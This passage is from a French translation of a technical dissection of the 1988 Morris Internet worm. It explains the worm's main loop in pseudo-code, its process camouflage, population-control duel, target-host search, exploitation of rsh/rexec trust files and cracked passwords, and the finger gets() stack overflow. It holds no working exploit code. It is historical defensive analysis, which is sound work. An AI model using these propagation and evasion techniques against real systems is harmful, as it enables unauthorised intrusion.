            aient &eacute;t&eacute; modifi&eacute; pour utiliser les programmes 
            r&eacute;seaux de Berkeley comme <i>sendmail</i>, <i>fingerd</i> et 
            <i>rexec</i>.</p>
          <p class="texttitre"><a name="p4"></a>4. Etude d&eacute;taill&eacute;e</p>
          <p>Passons maintenant aux d&eacute;tails : nous devons suivre le fil 
            principal du ver puis examiner les structures de donn&eacute;es avant 
            d'&eacute;tudier chaque phase s&eacute;par&eacute;ment.</p>
          <p class="texttitre2"><a name="p41"></a>4.1 Le processus principal</p>
          <p>Quand le ver commence son ex&eacute;cution dans le <i>main()</i>, 
            il fait bien attention aux initialisations, aux moyens de d&eacute;fense 
            et de camouflage. La toute premi&egrave;re op&eacute;ration qu'il 
            effectue est de changer son nom en <i>sh</i>. Il r&eacute;duit le 
            temps durant lequel le ver est visible en changeant le nom de son 
            processus en un nom &eacute;trange comme <i>x9834753</i>. Il initialise 
            alors le g&eacute;n&eacute;rateur de nombres al&eacute;atoires, en 
            s'appuyant sur l'heure courante, d&eacute;sactive les core dumps, 
            et s'arrange pour mourir quand une connexion distante &eacute;choue. 
            Une fois tout ceci effectu&eacute;, le ver g&egrave;re la liste de 
            ses arguments. Il commence par rechercher l'option -<b>p</b> <i>$$</i>, 
            o&ugrave; <i>$$</i> repr&eacute;sente l'ID de son processus p&egrave;re 
            ; cette option indique au ver qu'il doit prendre soin de s'effacer 
            plus tard. Il lit alors chacun des fichiers qui lui ont &eacute;t&eacute; 
            pass&eacute; en argument ; si l'option pr&eacute;c&eacute;dente est 
            activ&eacute;e, il efface chaque fichier qu'il vient de lire. Si le 
            ver n'a pas r&eacute;cup&eacute;r&eacute; le fichier source d'amor&ccedil;age 
            <i>l1.c</i> comme argument, il se termine silencieusement ; c'est 
            probablement un moyen de ralentir les personnes qui sont en train 
            d'&eacute;tudier le ver. Si l'effacage des traces est activ&eacute;, 
            le ver ferme alors ses descripteurs de fichier, se coupant momentan&eacute;ment 
            de son ver p&egrave;re distant, et efface certains fichiers. (Un de 
            ceux-ci, <i>/tmp/.dumb</i>, n'est &agrave; aucun moment cr&eacute;e 
            par le ver, cette suppression semble venir d'une version pr&eacute;c&eacute;dente 
            du ver, et n'aurait pas &eacute;t&eacute; retir&eacute;e du programme.) 
            Le ver met alors sa liste d'arguments &agrave; z&eacute;ro, l&agrave; 
            encore pour contrecarrer le programme de statut syst&egrave;me <i>ps</i>. 
            L'&eacute;tape suivante est l'initialisation de la liste des interfaces 
            r&eacute;seaux du ver ; ces interfaces sont utilis&eacute;es pour 
            trouver des r&eacute;seaux locaux et chercher des adresses alternatives 
            pour la machine en court. Enfin, si l'option -<b>p</b> est pass&eacute;e, 
            le ver re-initialise son groupe de processus et tue les processus 
            qui l'ont aid&eacute; &agrave; se lancer. La derni&egrave;re action 
            qu'effectue le ver dans la fonction <i>main()</i> est d'appeler une 
            fonction que nous avons nomm&eacute; <i>doit()</i>, qui contient la 
            boucle principale du ver.</p>
          <pre>doit()
{
	<i>lance le générateur de nombres aléatoires en se basant sur l'heure</i>
	<i>attaque de machines : gateways, réseaux locaux, réseaux externes</i>
	checkother();
	send message();
	for(;;)
	{
		cracksome();
		other_sleep(30);
		cracksome();
		<i>changement de l'identifiant de processus</i>
		<i>attaque de machines : gateways, hôtes connus, réseaux distants, réseaux locaux</i>
		other_sleep(20);
		if (<i>12 heures se sont passés</i>)
			<i>vider la liste des machines</i>
		if (pleasequit && nextw > 10)
			exit(0);
	}
}</pre>
        </div>
        <div align="center"> 
          <p>Pseudo code &quot;C&quot; pour la fonction <i>doit()</i></p>
          <p align="left"><i>doit()</i> lance un court prologue avant d'entrer 
            dans la boucle principale. Il fixe (inutilement) le g&eacute;n&eacute;rateur 
            de nombres al&eacute;atoires avec l'heure courante, tout en sauvant 
            l'heure afin qu'il puisse d&eacute;terminer depuis combien de temps 
            il tourne. Le ver commence alors sa premi&egrave;re infection. Il 
            attaque tout d'abord les passerelles (gateways) qu'il a trouv&eacute; 
            avec la commande de surveillance r&eacute;seau <i>netstat</i> ; s'il 
            ne parvient pas &agrave; infecter l'une de ces machines, alors il 
            cherche des machines sur le r&eacute;seau local avec un num&eacute;ro 
            d'h&ocirc;te al&eacute;atoire, ensuite il fait la m&ecirc;me chose 
            mais avec les machines se trouvant de l'autre c&ocirc;t&eacute; de 
            la passerelle, dans tous les cas il s'arr&ecirc;te d&egrave;s qu'il 
            a trouv&eacute; une machine. (Remarquez que cette s&eacute;quence 
            d'attaque diff&egrave;re de la s&eacute;quence utilis&eacute;e par 
            le ver une fois que ce dernier est entr&eacute; dans la boucle principale.)</p>
          <p align="left">Apr&egrave;s ces premi&egrave;res tentatives d'infection, 
            le worm appelle la routine <i>checkother()</i> pour v&eacute;rifier 
            qu'un autre ver ne se trouve pas sur la machine locale. Dans cette 
            routine le ver agit comme un client qui communique avec un ver pr&eacute;existant 
            qui joue le r&ocirc;le de serveur ; ils peuvent alors s'&eacute;changer 
            des messages de &quot;contr&ocirc;le de la population&quot; apr&egrave;s 
            quoi l'un des deux vers va &eacute;ventuellement s'&eacute;teindre.</p>
          <p align="left">Une routine &eacute;trange est lanc&eacute;e juste avant 
            d'entrer dans la boucle principale. Cette routine que nous avons appel&eacute; 
            <i>send_message()</i> n'envoie en fait rien du tout. Il semblerait 
            quelle soit faite afin qu'une copie du ver sur 15 envoie un datagramme 
            de 1 octet sur un port de la machine <i>ernie.berkeley.edu</i>, qui 
            est localis&eacute;e &agrave; l'UC Berkeley, au Computer Science Department. 
            Il a &eacute;t&eacute; sugg&eacute;r&eacute; que ceci n'&eacute;tait 
            qu'une feinte d&eacute;sign&eacute;e &agrave; faire porter l'attention 
            sur <i>ernie</i>, et non sur la v&eacute;ritable machine de l'auteur. 
            Puisque la routine a un bug (elle met en place un socket TCP mais 
            essaye d'envoyer un paquet UDP), rien n'est envoy&eacute; au final. 
            Il est aussi possible que cela soit une feinte plus recherch&eacute;e, 
            destin&eacute;e &agrave; &ecirc;tre d&eacute;couverte seulement par 
            les d&eacute;compileurs ; si cela &eacute;tait le cas, ce ne serait 
            pas le seul obstacle que l'auteur a d&eacute;lib&eacute;r&eacute;ment 
            plac&eacute; sur notre chemin. Dans tous les cas, les administrateurs 
            de Berkeley n'ont d&eacute;tect&eacute; aucun processus &eacute;coutant 
            sur le port 11357 de <i>ernie</i>, et nous n'avons trouv&eacute; aucun 
            code dans le ver qui &eacute;coute sur ce port, ind&eacute;pendamment 
            de la machine.</p>
          <p align="left">La boucle principale d&eacute;bute avec l'appel &agrave; 
            une fonction que nous avons baptis&eacute; <i>cracksome()</i> pour 
            le cassage de mots de passe. Le cassage de mots de passe est une activit&eacute; 
            que le ver fait constamment et de mani&egrave;re incr&eacute;mentale. 
            Il fait une pause de 30 secondes pour voir s'il y a des copies du 
            ver qui se sont introduites sur la machine locale, et puis retourne 
            au cracking. Ensuite il fork (cr&eacute;e un nouveau processus fonctionnant 
            comme une copie du m&ecirc;me ver) et l'ancien processus se termine 
            ; cela sert &agrave; changer les num&eacute;ros d'I.D. des processus 
            et de rendre plus difficile la d&eacute;couverte du ver avec la commande 
            d'information syst&egrave;me ps. Le ver retourne alors &agrave; l'&eacute;tape 
            d'infection, en essayant (par ordre de pr&eacute;f&eacute;rence) les 
            routeurs, les machines pr&eacute;sentes dans un fichier comme <i>/etc/hosts.equiv</i>, 
            les h&ocirc;tes al&eacute;atoires de l'autre c&ocirc;t&eacute; du 
            routeur et ceux des r&eacute;seaux locaux. Comme pr&eacute;c&eacute;demment, 
            s'il parvient &agrave; infecter une nouvelle machine, il marque cette 
            machine dans une liste et arr&ecirc;te l'infection pour le moment. 
            Apr&egrave;s l'infection, le ver passe deux minutes pour regarder 
            une nouvelle fois s'il n'y a pas de nouvelles copies du ver ; cela 
            est fait parce qu'un nouvel h&ocirc;te distant infect&eacute; peut 
            essayer de r&eacute;infecter l'h&ocirc;te local. Si 12 heures se sont 
            pass&eacute;es et que le ver est toujours actif, il suppose qu'il 
            n'a pas eu de chance car des machines ou des r&eacute;seaux devaient 
            &ecirc;tre hors service ou &eacute;teints, et il r&eacute;initialise 
            sa table d'adresses si bien qu'il peut reprendre au d&eacute;but. 
            A la fin de la boucle principale le ver regarde s'il peut mourir en 
            fonction des r&eacute;sultats de contr&ocirc;le de la population, 
            et si c'est le cas, et s'il a obtenu une quantit&eacute; suffisante 
            de mots de passe cass&eacute;s, il quitte.</p>
          <p class="texttitre2" align="left"><a name="p42"></a>4.2 Structures 
            de donn&eacute;es</p>
          <p align="left">Le ver maintient au moins quatre structures de donn&eacute;es 
            int&eacute;ressantes, et chacune est associ&eacute;e &agrave; un ensemble 
            de routines.</p>
          <p align="left">La structure <i>object</i> est utilis&eacute;e pour 
            contenir des copies de fichiers. Les fichiers sont encrypt&eacute;s 
            en utilisant la fonction <i>xorbuff()</i> au moment o&ugrave; ils 
            sont en m&eacute;moire, si bien qu'un dump du ver ne r&eacute;v&egrave;le 
            rien d'int&eacute;ressant. Les fichiers sont copi&eacute;s sur le 
            disque du syst&egrave;me distant avant de commencer un nouveau worm, 
            et les nouveaux worms mettent ces fichiers en m&eacute;moire et suppriment 
            les copies du disque comme t&acirc;che de d&eacute;marrage. Chaque 
            structure contient un nom, une longueur et un pointeur vers un buffer. 
            La fonction <i>getobjectbyname()</i> r&eacute;cup&egrave;re un pointeur 
            vers une structure d'objet nomm&eacute;e ; pour diff&eacute;rentes 
            raisons, elle n'est appel&eacute;e que pour lancer le fichier source 
            d'amor&ccedil;age.</p>
          <p align="left">La structure <i>interface</i> contient des informations 
            sur la configuration des interfaces r&eacute;seaux de la machine en 
            cours. Cela est principalement utilis&eacute; pour trouver des r&eacute;seaux 
            locaux. Cette structure est compos&eacute;e d'un nom, d'une adresse 
            r&eacute;seau, d'un masque de sous r&eacute;seau et de quelques flags. 
            La table des interfaces est initialis&eacute;e une fois au d&eacute;marrage.</p>
          <p align="left">La structure <i>host</i> est utilis&eacute;e pour garder 
            une trace des statuts et des adresses des machines. Les machines sont 
            ajout&eacute;es dynamiquement &agrave; cette liste, au fur et &agrave; 
            mesure que le ver rencontre de nouvelles sources de noms d'h&ocirc;tes 
            et d'adresses. Cette liste peut &ecirc;tre explor&eacute;e &agrave; 
            la recherche d'une adresse ou d'un nom particulier, avec une option 
            pour ins&eacute;rer une nouvelle entr&eacute;e si la recherche n'a 
            rien donn&eacute;e. Les bits d'indication (flags) sont utilis&eacute;s 
            pour indiquer si l'h&ocirc;te est une passerelle, s'il a &eacute;t&eacute; 
            trouv&eacute; par l'interm&eacute;diaire d'une table syst&egrave;me 
            comme <i>/etc/hosts.equiv</i>, si le ver a consid&eacute;r&eacute; 
            pour diff&eacute;rentes raisons que cette machine &eacute;tait impossible 
            &agrave; attaquer, et si l'h&ocirc;te a d&eacute;j&agrave; &eacute;t&eacute; 
            infect&eacute; avec succ&egrave;s. Les bits pour &quot;infection impossible&quot; 
            et &quot;infect&eacute;&quot; sont effac&eacute;s toutes les 12 heures, 
            et les h&ocirc;tes &agrave; faible priorit&eacute; sont effac&eacute;s 
            pour &ecirc;tre &agrave; nouveau accumul&eacute;s plus tard. La structure 
            peut contenir jusqu'&agrave; 12 noms (alias) et jusqu'&agrave; 6 adresses 
            r&eacute;seaux distinctes pour chaque machine.</p>
          <p align="left">Dans nos sources, ce que nous avons appel&eacute; la 
            structure <i>muck</i> (salet&eacute;, saloperie, cochonnerie) est 
            utilis&eacute;e pour garder trace des comptes dans un but de cracking 
            de passwords. (Nous lui avons d&eacute;cern&eacute; le nom <i>muck</i> 
            pour des raisons sentimentales, bien que <i>pw</i> ou <i>act</i> auraient 
            &eacute;t&eacute; plus parlant.) Chaque structure contient un nom 
            de compte, un password crypt&eacute; ou d&eacute;crypt&eacute; (si 
            possible) plus le r&eacute;pertoire personnel de l'utilisateur (home 
            directory) ainsi que des informations personnelles tir&eacute;es du 
            fichier password.</p>
          <p class="texttitre2" align="left"><a name="p43"></a>4.3 Croissance 
            de la population (Propagation)</p>
          <p align="left">Le ver poss&egrave;de un m&eacute;canisme qui semble 
            avoir &eacute;t&eacute; cr&eacute;e pour limiter le nombre de copies 
            du ver qui tournent sur un syst&egrave;me donn&eacute;, mais en dehors 
            de cela notre compr&eacute;hension de pourquoi ce ver a &eacute;t&eacute; 
            cr&eacute;e est limit&eacute;e. Cela n'emp&ecirc;che &eacute;videmment 
            pas la surcharge d'un syst&egrave;me bien que cela acc&eacute;l&egrave;re 
            de mani&egrave;re &eacute;vidente l'infection pour rendre les premi&egrave;res 
            copies ind&eacute;tectables. Il a &eacute;t&eacute; sugg&eacute;r&eacute; 
            qu'une simulation des fonctions de contr&ocirc;le de la population 
            du ver pourrait r&eacute;v&eacute;ler plus de d&eacute;tails sur sa 
            cr&eacute;ation et nous serions int&eacute;ress&eacute; d'&eacute;crire 
            un papier sur une telle simulation.</p>
          <p align="left">Le ver utilise une technique client-et-serveur pour 
            contr&ocirc;ler le nombre de copies ex&eacute;cut&eacute;es sur la 
            machine courante. Une routine <i>checkother()</i> est appel&eacute;e 
            au d&eacute;marrage. Cette fonction essaye de se connecter &agrave; 
            un serveur en &eacute;coute sur le port TCP 23357. La tentative de 
            connexion retourne imm&eacute;diatement si aucun serveur n'est pr&eacute;sent, 
            mais se bloque si un est disponible ou occup&eacute; ; un ver serveur 
            lance r&eacute;guli&egrave;rement son code serveur pendant les op&eacute;rations 
            qui prennent du temps si bien que la queue des connexions n'augmente 
            jamais beaucoup. Une fois que le client a &eacute;chang&eacute; des 
            nombres magiques (magic numbers) avec le serveur sous la forme d'une 
            authentification triviale, le client et le serveur jouent &agrave; 
            la courte paille pour d&eacute;terminer qui survivra. Un ou-exclusif 
            entre les bits de poids faibles respectif des nombres al&eacute;atoires 
            du client et du serveur est effectu&eacute;. Si le r&eacute;sultat 
            vaut 1 le serveur est gagnant, dans le cas contraire le client sort 
            vainqueur. Le perdant active son drapeau (flag) <i>pleasequit</i> 
            qui lui permet &eacute;ventuellement de quitter en fin de boucle principale. 
            Si &agrave; un moment un probl&egrave;me survient - une lecture du 
            serveur &eacute;choue, ou qu'un mauvais nombre magique est retourn&eacute; 
            - le ver client quitte la fonction, devenant un ver qui n'agira jamais 
            en tant que serveur et en cons&eacute;quence ne s'implique pas dans 
            la croissance de la population. Un test est effectu&eacute; au tout 
            d&eacute;but de la fonction pour d&eacute;tecter un &eacute;ventuel 
            serveur cataleptique. Apr&egrave;s ce test 1 ver sur 7 abandonne le 
            contr&ocirc;le de la population. De cette mani&egrave;re le ver ach&egrave;ve 
            le jeu de population dans <i>checkother()</i> dans l'un de ces trois 
            &eacute;tats : programm&eacute; pour mourir apr&egrave;s un certain 
            temps, avec le drapeau <i>pleasequit</i> activ&eacute; ; fonctionnant 
            en tant que serveur avec la possibilit&eacute; de perdre le jeu ult&eacute;rieurement 
            ; et immortel, &agrave; l'abris des dangers du contr&ocirc;le de la 
            population.</p>
          <p align="left">Une routine compl&eacute;mentaire, <i>other_sleep()</i>, 
            ex&eacute;cute la fonction de serveur. Cette fonction utilise l'appel 
            syst&egrave;me <i>select()</i> de Berkeley comme chronom&egrave;tre 
            et accepte durant un laps de temps de quelques secondes les connections 
            venant des clients. Au d&eacute;but de la fonction il v&eacute;rifie 
            s'il dispose d'un port de communication avec lequel accepter des connexions, 
            si ce n'est pas le cas, il laisse passer le laps de temps pr&eacute;d&eacute;fini 
            et retourne. Dans le cas contraire il boucle sur <i>select()</i>, 
            diminue le temps restant apr&egrave;s qu'il ai servi un client jusqu'&agrave; 
            ce qu'il ne reste plus de temps et que le ver retourne. Quand le serveur 
            obtient un client, il effectue l'inverse du protocole client, d&eacute;cidant 
            &eacute;ventuellement s'il doit continuer ou quitter. <i>other_sleep()</i> 
            est appel&eacute; &agrave; partir de beaucoup d'endroits diff&eacute;rents 
            du code, si bien que les clients n'attendent jamais bien longtemps.</p>
          <p align="left">Au vu du syst&egrave;me &eacute;labor&eacute; du ver 
            &agrave; contr&ocirc;ler la r&eacute;infection, qu'est ce qui le rend 
            si rapide &agrave; se reproduire sur une machine au point de la submerger 
            ? Un des coupables est le test du &quot;1 sur 7&quot; dans <i>checkother()</i> 
            : les vers qui sautent la phase de client deviennent immortels, et 
            ainsi ne risquent pas de dispara&icirc;tre lors du duel. Une autre 
            cause de surcharge de la m&eacute;moire est le fait que quand un ver 
            d&eacute;cide qu'il a perdu, il peut encore effectuer beaucoup de 
            taches avant de r&eacute;ellement quitter. La routine du client n'est 
            m&ecirc;me pas lanc&eacute;e jusqu'&agrave; ce que le ver nouveau-n&eacute; 
            tente d'infecter au moins une machine distante, et m&ecirc;me si le 
            ver perd le duel, il continue de s'ex&eacute;cuter &agrave; la fin 
            de la boucle principale, et l&agrave; encore il ne quitte pas tant 
            qu'il n'a pas fait le tour de la boucle plusieurs fois, &eacute;tant 
            bloqu&eacute; dans le cassage des mots de passes. Enfin, les nouveaux 
            vers perdent tout l'historique des infections r&eacute;alis&eacute;es 
            par leurs parents, si bien que les enfants d'un ver sont constamment 
            en train d'essayer de r&eacute;infecter les machines de leur p&egrave;re, 
            ainsi que les enfants d'autres vers. Si on rassemble toutes ces donn&eacute;es 
            il n'y a en fait aucune surprise qu'au bout de une ou deux heures 
            d'infections, une machine soit enti&egrave;rement d&eacute;vou&eacute;e 
            la l'ex&eacute;cution des vers.</p>
          <p class="texttitre2" align="left"><a name="p44"></a>4.4 La recherche 
            de nouvelles machines &agrave; infecter</p>
          <p align="left">Une des caract&eacute;ristiques du ver est que toutes 
            ses attaques sont actives, jamais passives. Par cons&eacute;quent 
            le ver n'a jamais &agrave; attendre qu'un utilisateur vienne le lancer 
            sur une autre machine contrairement &agrave; la plupart des Chevaux 
            de Troie - il doit chercher des ordinateurs par ses propres moyens.</p>
          <p align="left">Le ver dispose d'une liste bien distincte de priorit&eacute;s 
            quand il fait la chasse aux machines. Ses victimes pr&eacute;f&eacute;r&eacute;es 
            sont les passerelles ; la fonction <i>hg()</i> essaie d'infecter toutes 
            les machines qu'elle suppose &ecirc;tre des passerelles. C'est seulement 
            une fois que toutes les passerelles sont consid&eacute;r&eacute;es 
            comme &eacute;tant soit infect&eacute;es soit inattaquables que le 
            ver s'en prend &agrave; d'autres h&ocirc;tes. <i>hg()</i> appelle 
            la fonction<i> rt_init()</i> qui lui donne une liste de passerelles 
            ; cette liste a &eacute;t&eacute; g&eacute;n&eacute;r&eacute;e &agrave; 
            partie du r&eacute;sultat de la commande de surveillance r&eacute;seau 
            <i>Netstat</i>. Le ver prend bien soins de sauter le loopback ainsi 
            que les interfaces r&eacute;seau locales (dans le cas o&ugrave; la 
            machine en cours est un routeur) ; il m&eacute;lange ensuite al&eacute;atoirement 
            la liste et ajoute les 20 premiers routeurs au tableau des machines 
            afin d'acc&eacute;l&eacute;rer les recherches initiales. Il teste 
            alors chaque routeur dans l'ordre jusqu'&agrave; ce qu'il trouve un 
            h&ocirc;te qu'il puisse infecter, o&ugrave; qu'il n'ai plus d'h&ocirc;tes 
            &agrave; disposition.</p>
          <p align="left">Apr&egrave;s avoir pris soin des routeurs, la priorit&eacute; 
            suivante du ver concerne les machines trouv&eacute;es en scannant 
            les fichiers syst&egrave;mes. Au d&eacute;but du cassage de mot de 
            passes, les fichiers <i>/etc/hosts.equiv</i> (qui contient le nom 
            des machines qui peuvent se connecter &agrave; la machine locale sans 
            authentification) et <i>/.rhosts</i> (qui contient les noms de machines 
            auxquelles sont accord&eacute;es certains privil&egrave;ges de login) 
            sont examin&eacute;s, tout comme les fichiers <i>.forward</i> de chaque 
            utilisateur (qui donnent la liste de toutes les machines auxquelles 
            un mail est retransmis). Ces h&ocirc;tes sont marqu&eacute;s (drapeau) 
            de telle fa&ccedil;on qu'ils puissent &ecirc;tre scann&eacute;s avant 
            les autres. La fonction <i>hi()</i> se charge alors d'attaquer ces 
            machines.</p>
          <p align="left">Une fois que les machines les plus rentables ont &eacute;t&eacute; 
            utilis&eacute;es, le ver commence &agrave; chercher les machines qui 
            ne sont pas recens&eacute;es dans des fichiers. La routine <i>hl()</i> 
            &eacute;tudie les r&eacute;seaux locaux : elle teste les adresses 
            des machines locales, en concat&eacute;nant l'adresse du r&eacute;seau 
            avec une valeur al&eacute;atoire. <i>ha()</i> effectue la m&ecirc;me 
            t&acirc;che pour les machines externes, &agrave; la recherche d'adresses 
            alternatives aux passerelles. Un code sp&eacute;cial g&egrave;re la 
            r&egrave;gle d'ARPAnet qui consiste &agrave; mettre le chiffre IMP 
            dans les bits de poids faible de l'adresse et le port IMP actuel de 
            la machine dans les bits de poids fort de l'adresse. Une fonction 
            qui effectue diff&eacute;rentes &quot;enqu&ecirc;tes&quot; al&eacute;atoires 
            et que nous avons nomm&eacute; <i>hack_netof()</i>, semble poss&eacute;der 
            un bug qui emp&ecirc;che le ver d'attaquer des machines sur les r&eacute;seaux 
            locaux ; cela peut bien s&ucirc;r &ecirc;tre d&ucirc; &agrave; une 
            mauvaise interpr&eacute;tation de notre part, mais dans tous les cas 
            la recherche de machines &agrave; travers les fichiers syst&egrave;mes 
            devrait &ecirc;tre suffisante pour couvrir toutes ou presque toutes 
            les machines locales.</p>
          <p align="left">Le cassage de password est un autre g&eacute;n&eacute;rateur 
            de nom de machines, mais comme il est trait&eacute; s&eacute;par&eacute;ment 
            de l'habituel plan d'attaque pr&eacute;sent&eacute; ici, le sujet 
            sera &eacute;tudi&eacute; plus loin avec les autres calculs concernant 
            les mots de passes.</p>
          <p class="texttitre2" align="left"><a name="p45"></a>4.5 Failles de 
            s&eacute;curit&eacute;</p>
        </div>
        <blockquote> 
          <div align="center"> 
            <p align="left">The first fact to face is that Unix was not developed 
              with security, in any realistic sense, in mind... [Dennis Ritchie, 
              &quot;On the security of Unix&quot;]</p>
          </div>
        </blockquote>
        <div align="left"> 
          <p>Cette section traite des services TCP utilis&eacute;s par le ver 
            pour p&eacute;n&eacute;trer des syst&egrave;mes. Il est injuste d'utiliser 
            la citation pr&eacute;c&eacute;dente alors que l'impl&eacute;mentation 
            des services que nous allons &eacute;tudier a &eacute;t&eacute; distribu&eacute;e 
            par Berkeley plut&ocirc;t que Bell Labs, mais le sentiment est tout 
            &agrave; fait appropri&eacute;. Pendant tr&egrave;s longtemps la balance 
            entre la s&eacute;curit&eacute; et la facilit&eacute; d'utilisation 
            des syst&egrave;mes Unix a pench&eacute;e en faveur de la facilit&eacute; 
            d'utilisation. Comme Brian Reid l'a dit &agrave; propos de l'intrusion 
            de Stanford il y a deux ans : &quot;La commodit&eacute; accord&eacute;e 
            &agrave; un programmeur va &agrave; l'encontre de la s&eacute;curit&eacute;, 
            parce que cette commodit&eacute; devient celle de l'intrus si le compte 
            du programmeur est compromis.&quot; La le&ccedil;on tir&eacute;e de 
            cette exp&eacute;rience semble &ecirc;tre oubli&eacute;e par la plupart 
            des personnes, mais pas par l'auteur du worm.</p>
          <p class="textgras"><a name="p451"></a>4.5.1 Rsh et rexec</p>
        </div>
        <blockquote> 
          <div align="left">These notes describe how the design of TCP/IP and 
            the 4.2BSD implementation allow users on untrusted and possibly very 
            distant hosts to masquerade as users on trusted hosts. [Robert T. 
            Morris, &quot;A Weakness in the 4.2BSD Unix TCP/IP Software&quot;]</div>
        </blockquote>
        <div align="left"> 
          <p><i>Rsh</i> et <i>rexec</i> sont des services r&eacute;seau qui offrent 
            des interpr&eacute;teurs de commande &agrave; distance. <i>Rexec</i> 
            utilise une authentification par mot de passe ; <i>rsh</i> s'appuie 
            sur des fichiers d&eacute;crivant les connexions entrantes privil&eacute;gi&eacute;es 
            et leurs permissions. Deux vuln&eacute;rabilit&eacute;s sont exploit&eacute;es 
            par le ver - la probabilit&eacute; qu'une machine distante qui poss&egrave;de 
            un compte similaire &agrave; un compte local poss&egrave;de aussi 
            le m&ecirc;me password, permet l'infiltration par le biais de <i>rexec</i>, 
            et la probabilit&eacute; qu'un tel compte distant inclura la machine 
            locale dans ses fichiers de droits <i>rsh</i>. Ces deux vuln&eacute;rabilit&eacute;s 
            sont vraiment des probl&egrave;mes de laxisme ou de confort des utilisateurs 
            et sont dues &agrave; l'administrateur syst&egrave;me et non &agrave; 
            un bug actuel, mais elles doivent &ecirc;tre prises comme des facteurs 
            d'infection tout comme une faille de s&eacute;curit&eacute; involontaire.</p>
          <p>La premi&egrave;re utilisation de <i>rsh</i> faite par le ver est 
            tr&egrave;s simple : il recherche un compte distant avec le m&ecirc;me 
            nom que celui qui est (secr&egrave;tement) en train de faire tourner 
            le ver sur la machine locale. Ce test fait partie du plan standard 
            de piratage effectu&eacute; pour chaque h&ocirc;te ; si il &eacute;choue, 
            le ver laisse la place &agrave; <i>finger</i>, puis <i>sendmail</i>. 
            Beaucoup de sites comme Utah &eacute;taient d&eacute;j&agrave; prot&eacute;g&eacute;s 
            contre cette attaque triviale en ne fournissant pas de shells distants 
            &agrave; des pseudo-utilisateurs comme <i>daemon</i> ou <i>nobody</i>.</p>
          <p>Une utilisation plus sophistiqu&eacute;e de ces services est faite 
            dans la proc&eacute;dure de cassage de mots de passe. Une fois qu'un 
            password est d&eacute;couvert, le ver essaie aussit&ocirc;t de s'introduire 
            chez l'h&ocirc;te o&ugrave; se trouve le compte cass&eacute;. Il lit 
            alors le fichier <i>.forward</i> de l'utilisateur (qui contient les 
            adresses vers lesquelles les mails sont relay&eacute;s) ainsi que 
            son fichier <i>.rhosts</i> (qui contient la liste des machines, et 
            optionnellement les noms d'utilisateurs sur ces machines, qui ont 
            un droit d'acc&egrave;s &agrave; la machine locale avec <i>rsh</i> 
            sans avoir &agrave; passer par l'habituelle saisie de mot de passe), 
            essayant chacune de ces machines jusqu'&agrave; ce qu'il r&eacute;ussisse 
            &agrave; s'y introduire. Chaque cible est attaqu&eacute;e de deux 
            mani&egrave;res diff&eacute;rentes. Le ver contacte d'abord le serveur 
            <i>rexec</i> de l'h&ocirc;te distant et lui donne le nom du compte 
            qu'il a trouv&eacute; dans le fichier <i>.forward</i> ou le fichier 
            <i>.rhosts</i> suivit du password qu'il a cass&eacute; auparavant. 
            Si cela &eacute;choue, le ver se connecte au serveur <i>rexec</i> 
            local avec le nom d'utilisateur local et contacte le serveur <i>rsh</i> 
            de sa cible. Le serveur <i>rsh</i> distant va permettre la connexion 
            si le nom de la machine qui vient de se connecter appara&icirc;t dans 
            le fichier <i>/etc/hosts.equiv</i> ou dans le fichier priv&eacute; 
            <i>.rhosts</i> de l'utilisateur.</p>
          <p>Renforcer la s&eacute;curit&eacute; de ces services r&eacute;seaux 
            est bien plus probl&eacute;matique que fixer un bug de <i>finger</i> 
            ou <i>sendmail</i>, malheureusement. Les utilisateurs n'aiment pas 
            &ecirc;tre oblig&eacute; de taper leurs passwords quand ils se connectent 
            &agrave; une machine de confiance et, de m&ecirc;me, ils n'aiment 
            pas avoir &agrave; se souvenir des mots de passes qu'ils utilisent 
            pour chaque machine auxquelles ils ont &agrave; se connecter. Certaines 
            solutions peuvent s'av&eacute;rer catastrophique, ainsi un utilisateur 
            qui g&egrave;re trop de mots de passe est suspectible de les noter 
            quelque part.</p>
          <p class="textgras"><a name="p452"></a>4.5.2 Finger</p>
        </div>
        <blockquote> 
          <div align="left"><i>gets</i> was removed from our [C library] a couple 
            days ago. [Bill Cheswick at AT&amp;T Bell Labs Research, private communication, 
            11/9/88]</div>
        </blockquote>
        <div align="left"> 
          <p>Le hack probablement le plus ing&eacute;nieux dans le worm est le 
            fait qu'il utilise le service TCP <i>finger</i> comme alternative 
            pour p&eacute;n&eacute;trer un syst&egrave;me. <i>Finger</i> fait 
            le compte-rendu des utilisateurs d'une machine, en signalant habituellement 
            des d&eacute;tails comme le nom complet de l'utilisateur, o&ugrave; 
            se trouve son bureau, le num&eacute;ro de son extension de t&eacute;l&eacute;phone 
            etc. La version de Berkeley (<a href="#f3" name="rf3">3</a>) du serveur 
            <i>finger</i> est un programme vraiment trivial : il lit la requ&ecirc;te 
            demand&eacute;e par l'ordinateur connect&eacute; puis lance le programme 
            local <i>finger</i> en lui passant cette m&ecirc;me requ&ecirc;te 
            en argument, il renvoie ensuite le r&eacute;sultat de ce programme. 
            Malheureusement le serveur <i>finger</i> lit la requ&ecirc;te en utilisant 
            <i>gets()</i>, une routine de la librairie C Standard, qui date de 
            l'&egrave;re des temps et qui ne v&eacute;rifie pas que les 512 octets 
            de m&eacute;moire r&eacute;serv&eacute;s sur la pile pour la requ&ecirc;te 
            ne sont pas d&eacute;bord&eacute;s. Le ver fournit au serveur <i>finger</i> 
            une requ&ecirc;te de 536 octets de longueur, la plus grosse partie 
            de la requ&ecirc;te est du code machine VAX qui demande au syst&egrave;me 
            d'ex&eacute;cuter l'interpr&eacute;teur de commande <i>sh</i> et les 
            24 octets suppl&eacute;mentaires repr&eacute;sentent juste ce qu'il 
            faut pour &eacute;craser la stack frame (correspond &agrave; l'environnement 
            d'une fonction avec ses param&egrave;tres, ses variables locales, 
            l'ancien environnement...) de la routine principale du serveur. Quand 
            la routine principale du serveur quitte, le pointeur de retour vers 
            la fonction appelante est suppos&eacute; &ecirc;tre restaur&eacute; 
            &agrave; partir de la pile, mais le ver y a &eacute;crit une adresse 
            qu'il a choisi et qui pointe vers le code VAX situ&eacute; dans le 
            buffer. Le programme saute sur le code du ver et lance l'interpr&eacute;teur 
            de commande, dont le ver se sert pour placer sa routine de d&eacute;marrage.</p>
          <p>Il n'a pas &eacute;t&eacute; &eacute;tonnant de voir, peu apr&egrave;s 
            l'annonce faite sur l'utilisation de cette caract&eacute;ristique 
            de <i>gets()</i> par le ver, bon nombre de personnes remplacer toutes 
            les instances de <i>gets()</i> dans leur code syst&egrave;me par une 
            version qui v&eacute;rifiait la taille du buffer. Certains sont m&ecirc;me 
            aller jusqu'&agrave; retirer <i>gets()</i> de la librairie, bien que 
